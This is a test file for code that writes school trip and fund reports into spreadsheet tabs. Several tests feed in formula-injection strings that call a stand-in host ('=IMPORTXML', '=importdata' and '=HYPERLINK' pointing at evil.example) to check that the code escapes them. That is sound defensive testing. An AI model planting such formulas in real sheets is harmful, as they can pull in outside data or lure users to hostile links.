import * as nodeCrypto from 'node:crypto';
import { createApp } from '../server/app';
import { MAX_REPORT_ROWS } from '../server/reports';
import { sampleCalendarEvents, sampleData } from '../server/sample-data';
import type { CellValue, RowData } from '../server/services';
import { TEST_NOW } from '../server/test-helpers';
import { TABLE_ORDER, TABLES, type TableName } from '../shared/schema';
import type { Report } from '../shared/types';
import {
  filtersLine,
  MAX_SHEET_REPORT_ROWS,
  nyTimestamp,
  reportLayout,
  reportTabName,
  runSheetReport,
  SHEET_REPORTS,
  sheetCell,
  sheetText,
  writeReportTab,
} from './reports-sheet';
import { createGasServices, type GasServices } from './services';
import { calendarApiItems, FakeRange, FakeSheet, installGasFakes, uninstallGasFakes, type GasFakes } from './testing/fakes';

type Spreadsheet = GoogleAppsScript.Spreadsheet.Spreadsheet;

let gas: GasFakes;

beforeEach(() => {
  gas = installGasFakes(nodeCrypto);
});
afterEach(() => uninstallGasFakes());

/** Sheets serial day numbers: 2026-10-21 is 46316 (2000-01-01 is 36526). */
const serial = (daysAfterTestDay: number) => 46316 + daysAfterTestDay;
const NOTE_PREFIX = 'Generated Oct 21, 2026 10:00 AM — rebuilt each time you run it; edit the other tabs, not this one.';

/** Every tab with its canonical headers, filled from `tables` (rows as a treasurer would type them). */
function loadTabs(tables: Partial<Record<TableName, RowData[]>>): void {
  for (const table of TABLE_ORDER) {
    const headers = [...TABLES[table].headers];
    const rows = (tables[table] ?? []).map((row) => headers.map((h) => cell(row[h])));
    gas.spreadsheet.addSheet(FakeSheet.withRows(table, [headers, ...rows]));
  }
}

function cell(value: CellValue | undefined): string | number | boolean | Date {
  return value === null || value === undefined ? '' : value;
}

/** The sample sheet as of TEST_NOW (Wed 2026-10-21, 10:00 New York), without the queued announcement, plus `more` rows. */
function sampleSheet(more: Partial<Record<TableName, RowData[]>> = {}): GasServices {
  const tables: Partial<Record<TableName, RowData[]>> = { ...sampleData(TEST_NOW, { demoSettings: true }), Announcements: [] };
  for (const [table, rows] of Object.entries(more) as Array<[TableName, RowData[]]>) tables[table] = [...(tables[table] ?? []), ...rows];
  loadTabs(tables);
  // The sample's linked "Music Dept" calendar, through the Calendar advanced service.
  gas.calendar.handler = () => ({ items: calendarApiItems(sampleCalendarEvents(TEST_NOW)) });
  const services = createGasServices();
  services.clock = { now: () => TEST_NOW };
  return services;
}

const spreadsheet = () => gas.spreadsheet as unknown as Spreadsheet;
const tab = (name: string) => gas.spreadsheet.getSheetByName(name)!;

describe('cells', () => {
  it('keeps text that starts like a formula as plain text', () => {
    expect(sheetText('=IMPORTXML("https://evil.example","//a")')).toBe('\'=IMPORTXML("https://evil.example","//a")');
    expect(sheetText('+1 603 555 0100')).toBe("'+1 603 555 0100");
    expect(sheetText('-5')).toBe("'-5");
    expect(sheetText('@everyone')).toBe("'@everyone");
    expect(sheetText("'quoted")).toBe("''quoted");
    expect(sheetText('Car Wash = fun')).toBe('Car Wash = fun');
    expect(sheetText('x'.repeat(60000))).toHaveLength(49999);
  });

  it('writes money in dollars, dates as serial days and blanks as empty cells', () => {
    expect(sheetCell('money', 185000)).toBe(1850);
    expect(sheetCell('money', -35050)).toBe(-350.5);
    expect(sheetCell('number', 3)).toBe(3);
    expect(sheetCell('date', '2026-10-21')).toBe(46316);
    expect(sheetCell('date', '2000-01-01')).toBe(36526);
    expect(sheetCell('date', 'someday')).toBe('someday');
    expect(sheetCell('text', null)).toBe('');
    expect(sheetCell('email', '=evil@example.com')).toBe("'=evil@example.com");
    expect(sheetCell('money', Number.NaN)).toBe('');
  });

  it('shows the time in New York, summer or winter', () => {
    expect(nyTimestamp('2026-10-21T14:00:00.000Z')).toBe('Oct 21, 2026 10:00 AM');
    expect(nyTimestamp('2026-12-01T17:05:00.000Z')).toBe('Dec 1, 2026 12:05 PM');
    expect(nyTimestamp('2027-01-01T04:59:00.000Z')).toBe('Dec 31, 2026 11:59 PM');
  });

  it('describes the filters in words', () => {
    const base = { kind: 'payments', filters: { from: '2026-07-01', to: '2027-06-30', activityId: 'FL27' } } as Report;
    expect(filtersLine(base)).toBe('Showing dates 7/1/2026 to 6/30/2027; activity FL27.');
    expect(filtersLine({ ...base, kind: 'trip-balances', filters: { includePaid: false } })).toBe(
      'Showing open activities; students with something left to pay.',
    );
    expect(filtersLine({ ...base, kind: 'roster', filters: { school: 'High School', ensemble: 'Band' } })).toBe('Showing school High School; group Band.');
    expect(filtersLine({ ...base, kind: 'open-items', filters: {} })).toBe('');
  });
});

describe('writeReportTab', () => {
  it('writes the trip balances to their own tab: note, bold frozen header, rows, totals, then the notes', () => {
    const services = sampleSheet();
    const before = gas.spreadsheet.getSheets().map((s) => s.getName());
    const { report, sheet } = runSheetReport(services, spreadsheet(), 'trip-balances');

    expect(sheet.getName()).toBe('Report: Trip balances');
    expect(gas.spreadsheet.getSheets().map((s) => s.getName())).toEqual([...before, 'Report: Trip balances']);
    const t = tab('Report: Trip balances');
    const rows = t.dump();
    expect(rows[0][0]).toBe(`${NOTE_PREFIX} (TMA App → Reports → Trip balances)`);
    expect(rows[0].slice(1).every((c) => c === '')).toBe(true);
    expect(rows[1]).toEqual(report.columns.map((c) => c.label));
    expect(rows[1].slice(0, 3)).toEqual(['Activity', 'Activity ID', 'Student']);
    expect(rows[2]).toEqual([
      'Florida 2027 – Disney & Universal', 'FL27', 'Maya Nguyen', 'S0003', 'F0002', 'Priya Nguyen', 'nguyen.family@example.com',
      'High School', 'Going', 1850, 350, 0, 0, 1500, 350, serial(25), serial(100), 'Owes',
    ]);
    // Sofia has no household: blank cells, not "null".
    expect(rows[3].slice(4, 7)).toEqual(['', '', '']);
    expect(rows.slice(2, 7).map((r) => r[3])).toEqual(['S0003', 'S0005', 'S0001', 'S0001', 'S0003']);
    expect(rows[7]).toEqual(['Total', '', '', '', '', '', '', '', '', 6185, 350, 350, 200, 5485, '', '', '', '']);
    expect(rows.slice(8).map((r) => r[0])).toEqual([
      '',
      report.description,
      'Showing open activities; students with something left to pay.',
      'Note: Pending = fund requests waiting for approval plus payments still clearing. Left to pay already takes off payments still clearing.',
    ]);

    expect(t.frozenRows).toBe(2);
    expect(t.fontWeights.get('2,1')).toBe('bold');
    expect(t.fontWeights.get('2,18')).toBe('bold');
    expect(t.fontWeights.get('8,10')).toBe('bold'); // totals
    expect(t.fontWeights.get('3,1')).toBeUndefined();
    // Money and dates on the data and totals rows (3–8) only.
    expect(t.numberFormats.get('3,10')).toBe('$#,##0.00');
    expect(t.numberFormats.get('8,14')).toBe('$#,##0.00');
    expect(t.numberFormats.get('3,16')).toBe('m/d/yyyy');
    expect(t.numberFormats.get('8,17')).toBe('m/d/yyyy');
    expect(t.numberFormats.get('9,10')).toBeUndefined();
    // Text columns are plain text on the same rows.
    expect(t.numberFormats.get('3,1')).toBe('@');
    expect(t.numberFormats.get('8,18')).toBe('@');
    expect(t.numberFormats.get('9,1')).toBeUndefined();
    // One setValues for the whole block.
    expect(t.ops.filter((op) => op.startsWith('setValues'))).toEqual(['setValues R1C1:12x18']);
  });

  it('writes negative money as negative numbers, and extra totals (credits, debits, net) under the amount', () => {
    const services = sampleSheet();
    runSheetReport(services, spreadsheet(), 'student-funds');
    const funds = tab('Report: Student funds').dump();
    const maya = funds.find((r) => r[1] === 'S0003')!;
    expect(maya.slice(6, 11)).toEqual([760, -350, 410, 0, 410]);
    expect(funds[7].slice(6, 11)).toEqual([2240, -550, 1690, 200, 1490]);

    runSheetReport(services, spreadsheet(), 'fund-activity');
    const t = tab('Report: Fund activity');
    const rows = t.dump();
    expect(rows[2].slice(0, 6)).toEqual([serial(-90), 'Avery Thompson', 'S0001', 'Fundraiser', 'Car Wash', 95]);
    // 10 rows (3–12); no column has a total, so no "Total" row: credits, debits and net follow.
    expect(rows.slice(12, 15).map((r) => [r[0], r[5]])).toEqual([
      ['Credits', 1060],
      ['Debits', -350],
      ['Net', 710],
    ]);
    expect(t.fontWeights.get('15,1')).toBe('bold');
    expect(t.numberFormats.get('15,6')).toBe('$#,##0.00');
    expect(t.numberFormats.get('3,1')).toBe('m/d/yyyy');
  });

  it("writes who's using the app: dates as dates, counts as numbers, a blank for never", () => {
    const services = sampleSheet();
    const { sheet } = runSheetReport(services, spreadsheet(), 'app-activity');
    expect(sheet.getName()).toBe("Report: Who's using the app");
    const t = tab("Report: Who's using the app");
    const rows = t.dump();
    expect(rows[1]).toEqual([
      'Household', 'Household ID', 'Status', 'Last opened app', 'Days since opened', 'Last signed in', 'Sign-ins',
      'Phones with notifications', 'Parents not signed in yet',
    ]);
    // Sample Sign-ins: Jordan opened the app yesterday, Marcus 2 days ago, the treasurer 3 days ago.
    expect(rows.slice(2, 7)).toEqual([
      ['Jordan Thompson & Casey Thompson', 'F0001', 'Active', serial(-1), 1, serial(-30), 2, 1, 1],
      ['Marcus Ortiz', 'F0003', 'Pending', serial(-2), 2, serial(-2), 1, 0, 0],
      ['treasurer@example.com', '', 'No household', serial(-3), 3, serial(-20), 3, 0, ''],
      ['Priya Nguyen', 'F0002', 'Active', '', '', '', 0, 0, 1],
      ['Total', '', '', '', '', '', 6, 1, 2],
    ]);
    expect(t.numberFormats.get('3,4')).toBe('m/d/yyyy');
    expect(t.numberFormats.get('3,5')).toBe('#,##0');
    expect(t.numberFormats.get('7,7')).toBe('#,##0');
    // Reading the report writes nothing, not even a Sign-ins row.
    expect(tab('Sign-ins').dump()).toHaveLength(4);
  });

  it('says "Nothing to show." for an empty report and leaves the totals out', () => {
    loadTabs({});
    const services = createGasServices();
    services.clock = { now: () => TEST_NOW };
    runSheetReport(services, spreadsheet(), 'payments');
    const rows = tab('Report: Payments').dump();
    expect(rows[2][0]).toBe('Nothing to show.');
    expect(rows.some((r) => r[0] === 'Total')).toBe(false);
    expect(rows[4][0]).toMatch(/^Every Payments row/);
  });

  it('clears and rewrites its tab on every run, and finds it whatever the capitals', () => {
    loadTabs({});
    const old = gas.spreadsheet.addSheet(FakeSheet.withRows('report: payments', [['stale'], ['old', 'rows'], ['x'], ['y'], ['z'], ['w']]));
    old.numberFormats.set('5,1', '0.00%');
    const services = createGasServices();
    runSheetReport(services, spreadsheet(), 'payments');
    runSheetReport(services, spreadsheet(), 'payments');
    expect(gas.spreadsheet.getSheets().filter((s) => s.getName().toLowerCase().startsWith('report:'))).toEqual([old]);
    expect(old.ops.filter((op) => op === 'clear')).toHaveLength(2);
    expect(old.dump().flat()).not.toContain('stale');
    expect(old.numberFormats.get('5,1')).toBeUndefined();
  });

  it('never runs text from the sheet as a formula', () => {
    loadTabs({
      Families: [
        { FamilyID: 'F0001', 'Parent Name': '+SUM(1,2)', Email: '=importdata("https://evil.example")@x.co', Phone: '+1 603 555 0100', Status: 'Active' },
      ],
      Students: [
        { StudentID: 'S0001', FamilyID: 'F0001', 'First Name': '=HYPERLINK("https://evil.example","Click")', 'Last Name': 'Doe', Grade: 9, School: 'High School', Instrument: '@home', Status: 'Active' },
      ],
    });
    const services = createGasServices();
    const { sheet } = runSheetReport(services, spreadsheet(), 'roster');
    const t = tab(sheet.getName());
    const header = t.dump()[1] as string[];
    const at = (label: string) => header.indexOf(label) + 1;
    expect(t.raw(3, at('Student'))).toBe('\'=HYPERLINK("https://evil.example","Click") Doe');
    expect(t.raw(3, at('Instrument'))).toBe("'@home");
    expect(t.raw(3, at('Parent 1'))).toBe("'+SUM(1,2)");
    expect(t.raw(3, at('Parent 1 email'))).toBe('\'=importdata("https://evil.example")@x.co');
    expect(t.raw(3, at('Parent 1 phone'))).toBe("'+1 603 555 0100");
    // What people see is the text as typed.
    expect(t.value(3, at('Parent 1 phone'))).toBe('+1 603 555 0100');
    // No written cell anywhere starts like a formula without the apostrophe.
    for (const line of t.cells) for (const value of line) if (typeof value === 'string') expect(value).not.toMatch(/^[=+\-@]/);
  });

  it('sets text, email and phone columns to plain text before writing, so "0456", "10-12" and "50%" stay as written', () => {
    const report: Report = {
      kind: 'payments',
      title: 'Payments',
      description: 'Payments.',
      generatedAt: '2026-10-21T14:00:00.000Z',
      filters: {},
      columns: [
        { key: 'date', label: 'Date', type: 'date' },
        { key: 'reference', label: 'Reference', type: 'text' },
        { key: 'amount', label: 'Amount', type: 'money' },
        { key: 'payer', label: 'Payer email', type: 'email' },
        { key: 'phone', label: 'Phone', type: 'phone' },
        { key: 'count', label: 'Count', type: 'number' },
      ],
      rows: [
        { date: '2026-10-12', reference: '0456', amount: 5000, payer: 'a@example.com', phone: '0603 555 0100', count: 1 },
        { date: '2026-10-13', reference: '10-12', amount: 2500, payer: null, phone: null, count: 2 },
        { date: '2026-10-14', reference: '50%', amount: 100, payer: null, phone: '+1 603 555 0100', count: 3 },
      ],
      totals: { amount: 7600, count: 6 },
      notes: ['A note.'],
      containsContactInfo: true,
    };
    // Every number format and the one setValues, in order.
    const steps: string[] = [];
    const setNumberFormat = FakeRange.prototype.setNumberFormat;
    const setValues = FakeRange.prototype.setValues;
    vi.spyOn(FakeRange.prototype, 'setNumberFormat').mockImplementation(function (this: FakeRange, format: string) {
      steps.push(`${format} R${this.row}C${this.column}:${this.numRows}x${this.numColumns}`);
      return setNumberFormat.call(this, format);
    });
    vi.spyOn(FakeRange.prototype, 'setValues').mockImplementation(function (this: FakeRange, values) {
      steps.push(`setValues R${this.row}C${this.column}:${this.numRows}x${this.numColumns}`);
      return setValues.call(this, values);
    });

    writeReportTab(spreadsheet(), report);
    // Plain text on the text, email and phone columns of the data and totals rows (3–6) first; the
    // money, date and number formats after, as before.
    expect(steps).toEqual([
      '@ R3C2:4x1',
      '@ R3C4:4x1',
      '@ R3C5:4x1',
      'setValues R1C1:9x6',
      'm/d/yyyy R3C1:4x1',
      '$#,##0.00 R3C3:4x1',
      '#,##0 R3C6:4x1',
    ]);
    const t = tab('Report: Payments');
    expect(t.dump().slice(2, 6).map((r) => r[1])).toEqual(['0456', '10-12', '50%', '']);
    // Text that starts like a formula still gets its apostrophe.
    expect(t.raw(5, 5)).toBe("'+1 603 555 0100");
    expect(t.numberFormats.get('2,2')).toBeUndefined(); // header
    expect(t.numberFormats.get('7,2')).toBeUndefined(); // below the totals
  });

  it('writes more rows than the app shows: the menu cannot pick filters to narrow a long report', () => {
    const raffle: RowData[] = [];
    for (let i = 0; i < MAX_REPORT_ROWS + 1; i++) raffle.push({ Date: '2026-09-01', StudentID: 'S0004', Type: 'Fundraiser', Description: `Raffle ticket ${i}`, Amount: 1 });
    const services = sampleSheet({ Ledger: raffle });
    const { report } = runSheetReport(services, spreadsheet(), 'fund-activity');
    // The sample's 10 rows this school year plus the raffle, all of them.
    expect(report.rows).toHaveLength(MAX_REPORT_ROWS + 11);
    expect(report.notes?.filter((n) => n.startsWith('Showing the first'))).toEqual([]);
    const rows = tab('Report: Fund activity').dump();
    expect(rows.filter((r) => String(r[4]).startsWith('Raffle ticket'))).toHaveLength(MAX_REPORT_ROWS + 1);
    // The newest row, the first a 5,000-row cap would drop, is on the tab.
    expect(rows[2 + MAX_REPORT_ROWS + 10].slice(0, 6)).toEqual([serial(-12), 'Ethan Nguyen', 'S0004', 'Fundraiser', 'Poinsettia sale', 35]);
    expect(rows[2 + MAX_REPORT_ROWS + 11].slice(0, 6)).toEqual(['Credits', '', '', '', '', 1060 + 5001]);
    expect(MAX_SHEET_REPORT_ROWS).toBe(50_000);
  });

  it("past its cap, says to narrow the report on the app's Reports screen, and still totals every row", () => {
    const services = sampleSheet();
    const { report } = runSheetReport(services, spreadsheet(), 'fund-activity', 3);
    expect(report.rows).toHaveLength(3);
    const note =
      'Showing the first 3 of 10 rows (the totals include all of them). Use the Reports screen in the app (Board tools → Reports) to narrow it. Pick a shorter date range or one activity to see the rest.';
    expect(report.notes).toContain(note);
    const rows = tab('Report: Fund activity').dump();
    expect(rows.slice(5, 8).map((r) => [r[0], r[5]])).toEqual([
      ['Credits', 1060],
      ['Debits', -350],
      ['Net', 710],
    ]);
    expect(rows.map((r) => r[0])).toContain(`Note: ${note}`);
  });

  it('touches no other tab, and Set up and the sync leave the report tabs alone', () => {
    const services = sampleSheet();
    const others = gas.spreadsheet.getSheets();
    const snapshot = (sheets: FakeSheet[]) =>
      JSON.stringify(sheets.map((s) => [s.getName(), s.dump(), s.ops.filter((op) => op !== 'getDataRange'), [...s.numberFormats], [...s.fontWeights]]));
    const othersBefore = snapshot(others);
    for (const { kind } of SHEET_REPORTS) runSheetReport(services, spreadsheet(), kind);
    expect(snapshot(others)).toBe(othersBefore);
    const reportTabs = gas.spreadsheet.getSheets().filter((s) => !others.includes(s));
    expect(reportTabs.map((s) => s.getName())).toEqual(SHEET_REPORTS.map((r) => reportTabName(r.kind)));

    // A full Set up / repair and a sync on the same sheet never read or change "Report: …" tabs.
    const reportsBefore = snapshot(reportTabs);
    const opsBefore = reportTabs.map((s) => s.ops.length);
    const app = createApp(createGasServices());
    const setup = app.setup({});
    expect(setup.createdTables).toEqual([]);
    expect(setup.addedColumns).toEqual([]);
    expect(app.syncTick().errors).toEqual([]);
    expect(snapshot(reportTabs)).toBe(reportsBefore);
    expect(reportTabs.map((s) => s.ops.length)).toEqual(opsBefore);
    // The store still reads the real tabs.
    expect(createGasServices().store.read('Payments').map((r) => r.data.Reference)).toEqual(['Check #1043 (deposit)']);
  });
});

describe('reportLayout', () => {
  it('puts every row in one rectangle as wide as the columns', () => {
    const services = sampleSheet();
    for (const { kind } of SHEET_REPORTS) {
      const { report } = runSheetReport(services, spreadsheet(), kind);
      const layout = reportLayout(report);
      expect(layout.width).toBe(report.columns.length);
      for (const row of layout.values) expect(row).toHaveLength(layout.width);
      expect(layout.headerRow).toBe(2);
      expect(layout.formattedRows).toBeGreaterThanOrEqual(Math.max(1, report.rows.length));
    }
  });
});

describe('writeReportTab with a report built elsewhere', () => {
  it('uses the report title for the tab name', () => {
    const report: Report = {
      kind: 'app-usage',
      title: 'App usage',
      description: 'Counts.',
      generatedAt: '2026-10-21T14:00:00.000Z',
      filters: {},
      columns: [
        { key: 'metric', label: 'What', type: 'text' },
        { key: 'value', label: 'Count', type: 'number' },
      ],
      rows: [{ metric: 'Households', value: 1234 }],
      containsContactInfo: false,
    };
    writeReportTab(spreadsheet(), report);
    const t = tab('Report: App usage');
    expect(t.dump().slice(1, 3)).toEqual([
      ['What', 'Count'],
      ['Households', 1234],
    ]);
    expect(t.numberFormats.get('3,2')).toBe('#,##0');
  });
});
